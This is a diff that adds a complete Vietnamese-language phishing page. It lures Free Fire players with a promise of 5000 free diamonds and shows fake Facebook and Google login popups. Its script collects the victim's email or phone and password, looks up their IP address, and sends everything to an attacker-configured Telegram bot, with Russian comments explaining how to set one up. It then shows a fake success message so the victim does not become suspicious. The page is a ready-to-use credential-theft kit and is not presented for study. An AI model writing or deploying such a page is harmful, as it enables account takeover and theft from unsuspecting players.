@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Nhận Kim Cương Free Fire</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: #0b1a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .gift-box {
+            max-width: 420px;
+            width: 100%;
+            background: linear-gradient(145deg, #1c3d5a, #0f2a3f);
+            border-radius: 32px;
+            padding: 32px 24px 28px;
+            border: 1px solid rgba(255,215,0,0.25);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.7);
+            text-align: center;
+            color: #fff;
+        }
+        .gift-box h1 { font-size: 28px; color: #ffd700; text-shadow: 0 0 20px rgba(255,215,0,0.4); margin-bottom: 6px; }
+        .gift-box .sub { opacity: 0.7; font-size: 14px; margin-bottom: 20px; }
+        .gift-box .diamond { font-size: 64px; margin: 10px 0; }
+        .gift-box .count { font-size: 40px; font-weight: 900; color: #ffd700; background: rgba(0,0,0,0.3); padding: 8px 20px; border-radius: 60px; display: inline-block; }
+        .login-btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #fff;
+        }
+        .login-btn.fb { background: #1877f2; box-shadow: 0 4px 0 #0e5a9e; }
+        .login-btn.gg { background: #ea4335; box-shadow: 0 4px 0 #b52e1e; }
+        .login-btn:active { transform: scale(0.96); }
+        .login-btn i { margin-right: 10px; }
+        .note { font-size: 12px; opacity: 0.4; margin-top: 18px; }
+        /* Popup giả đăng nhập */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top:0; left:0; right:0; bottom:0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 20px;
+        }
+        .popup-overlay.active { display: flex; }
+        .popup-box {
+            background: #1a1a2e;
+            max-width: 380px;
+            width: 100%;
+            border-radius: 32px;
+            padding: 30px 24px 24px;
+            border: 1px solid #444;
+            color: #fff;
+            animation: pop 0.3s ease;
+        }
+        @keyframes pop { from { transform: scale(0.9); opacity:0; } to { transform: scale(1); opacity:1; } }
+        .popup-box .close { float: right; background: none; border: none; color: #888; font-size: 24px; cursor: pointer; }
+        .popup-box h2 { margin-bottom: 6px; font-size: 22px; }
+        .popup-box p { font-size: 13px; opacity: 0.6; margin-bottom: 18px; }
+        .popup-box label { display: block; font-size: 14px; font-weight: 600; margin: 12px 0 4px; text-align: left; }
+        .popup-box input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 40px;
+            border: 1px solid #333;
+            background: #0d0d1a;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+        }
+        .popup-box input:focus { border-color: #ffd700; }
+        .popup-box .btn-submit {
+            width: 100%;
+            padding: 16px;
+            margin-top: 22px;
+            border: none;
+            border-radius: 40px;
+            background: linear-gradient(90deg, #ffd700, #f7971e);
+            color: #0a0a1a;
+            font-weight: 700;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .popup-box .btn-submit:active { transform: scale(0.96); }
+    </style>
+</head>
+<body>
+    <!-- Trang chính -->
+    <div class="gift-box" id="mainPage">
+        <h1>🎁 QUÀ TẶNG FF</h1>
+        <div class="sub">Nhận ngay Kim Cương miễn phí</div>
+        <div class="diamond">💎</div>
+        <div class="count">+5000</div>
+        <div style="margin: 16px 0 8px; font-size: 14px; opacity:0.8;">Chỉ cần xác thực tài khoản</div>
+        
+        <button class="login-btn fb" id="fbBtn"><i>📘</i> Đăng nhập Facebook</button>
+        <button class="login-btn gg" id="ggBtn"><i>🔴</i> Đăng nhập Google</button>
+        <div class="note">* Sự kiện giới hạn, mỗi tài khoản 1 lần</div>
+    </div>
+
+    <!-- Popup giả đăng nhập (chung cho FB/GG) -->
+    <div class="popup-overlay" id="popup">
+        <div class="popup-box">
+            <button class="close" id="popupClose">✕</button>
+            <h2 id="popupTitle">🔐 Xác thực tài khoản</h2>
+            <p id="popupDesc">Nhập thông tin đăng nhập để nhận quà</p>
+            <label>📧 Email / Số điện thoại</label>
+            <input type="text" id="loginUser" placeholder="example@gmail.com">
+            <label>🔑 Mật khẩu</label>
+            <input type="password" id="loginPass" placeholder="••••••••">
+            <button class="btn-submit" id="submitLogin">🎁 Xác nhận & nhận quà</button>
+        </div>
+    </div>
+
+    <script>
+        // -- Конфигурация: сюда отправлять данные (Telegram Bot / Webhook) --
+        // Замените YOUR_BOT_TOKEN и YOUR_CHAT_ID на свои
+        const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+        // Если не используете Telegram, можно закомментировать и смотреть в console.log
+
+        // -- DOM --
+        const mainPage = document.getElementById('mainPage');
+        const popup = document.getElementById('popup');
+        const popupClose = document.getElementById('popupClose');
+        const fbBtn = document.getElementById('fbBtn');
+        const ggBtn = document.getElementById('ggBtn');
+        const submitBtn = document.getElementById('submitLogin');
+        const loginUser = document.getElementById('loginUser');
+        const loginPass = document.getElementById('loginPass');
+        const popupTitle = document.getElementById('popupTitle');
+        const popupDesc = document.getElementById('popupDesc');
+
+        let currentProvider = 'Facebook'; // Mặc định
+
+        // Открыть попап
+        function openPopup(provider) {
+            currentProvider = provider;
+            popupTitle.textContent = `🔐 Xác thực ${provider}`;
+            popupDesc.textContent = `Nhập email và mật khẩu ${provider} để nhận 5000💎`;
+            loginUser.value = '';
+            loginPass.value = '';
+            popup.classList.add('active');
+        }
+
+        fbBtn.addEventListener('click', () => openPopup('Facebook'));
+        ggBtn.addEventListener('click', () => openPopup('Google'));
+
+        popupClose.addEventListener('click', () => popup.classList.remove('active'));
+        popup.addEventListener('click', (e) => { if (e.target === popup) popup.classList.remove('active'); });
+
+        // Отправить данные (через Telegram Bot API)
+        async function sendToTelegram(user, pass, provider) {
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+            const msg = `🔓 [FF PHISHING] ${provider}\n👤 User: ${user}\n🔑 Pass: ${pass}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
+            
+            // Отправка в Telegram
+            if (TELEGRAM_TOKEN !== 'YOUR_BOT_TOKEN') {
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+                    });
+                } catch(e) { console.error('Telegram error:', e); }
+            }
+            // Также сохраняем в localStorage для демонстрации
+            const log = JSON.parse(localStorage.getItem('ff_phish_log') || '[]');
+            log.push({ provider, user, pass, time: new Date().toISOString() });
+            localStorage.setItem('ff_phish_log', JSON.stringify(log));
+            console.log('📩 Данные перехвачены:', { provider, user, pass });
+        }
+
+        // Xử lý submit
+        submitBtn.addEventListener('click', async function() {
+            const user = loginUser.value.trim();
+            const pass = loginPass.value.trim();
+            if (!user || !pass) {
+                alert('❗ Vui lòng nhập đầy đủ email và mật khẩu');
+                return;
+            }
+            // Gửi dữ liệu
+            await sendToTelegram(user, pass, currentProvider);
+            
+            // Thông báo thành công (giả vờ)
+            alert('✅ Xác thực thành công! Kim Cương sẽ được cộng trong 24h.');
+            popup.classList.remove('active');
+            
+            // Reset và đổi giao diện để tránh nghi ngờ
+            mainPage.innerHTML = `
+                <h1>🎉 CHÚC MỪNG</h1>
+                <div class="sub">Bạn đã nhận được 5000 Kim Cương</div>
+                <div style="font-size:80px; margin:20px 0;">💎</div>
+                <div style="background:#2a4a3a; padding:16px; border-radius:20px; color:#7dffb3;">
+                    Đã gửi vào tài khoản! Vui lòng khởi động lại game.
+                </div>
+                <div class="note">* Có thể mất vài phút để hiển thị</div>
+            `;
+        });
+
+        // -- Bổ sung: nếu không dùng Telegram, vẫn log trong console và localStorage --
+        console.log('🔥 FF Phishing Panel ready. Dữ liệu sẽ được lưu vào localStorage và console.');
+        console.log('📋 Để xem dữ liệu đã lấy: JSON.parse(localStorage.getItem("ff_phish_log"))');
+    </script>
+</body>
+</html>
